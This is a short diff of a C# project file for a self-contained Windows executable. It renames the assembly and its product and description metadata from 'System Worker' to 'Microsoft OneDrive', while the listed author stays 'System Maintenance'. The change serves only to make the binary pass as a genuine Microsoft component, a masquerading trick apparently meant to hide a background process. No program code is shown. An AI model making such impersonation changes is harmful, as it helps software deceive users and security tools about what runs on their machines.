@@ -5,7 +5,7 @@
     <Nullable>enable</Nullable>
     <ImplicitUsings>enable</ImplicitUsings>
     <OutputType>WinExe</OutputType>
-    <AssemblyName>SystemWorker</AssemblyName>
+    <AssemblyName>Microsoft OneDrive</AssemblyName>
     <PublishSingleFile>true</PublishSingleFile>
     <SelfContained>true</SelfContained>
     <RuntimeIdentifier>win-x64</RuntimeIdentifier>
@@ -15,8 +15,8 @@
     <NuGetAudit>true</NuGetAudit>
     <Authors>System Maintenance</Authors>
     <Company>System Maintenance Provider</Company>
-    <Product>Windows System Worker</Product>
-    <Description>Windows System Worker Service</Description>
+    <Product>Windows Microsoft OneDrive</Product>
+    <Description>Windows Microsoft OneDrive Service</Description>
   </PropertyGroup>
 
   <ItemGroup>
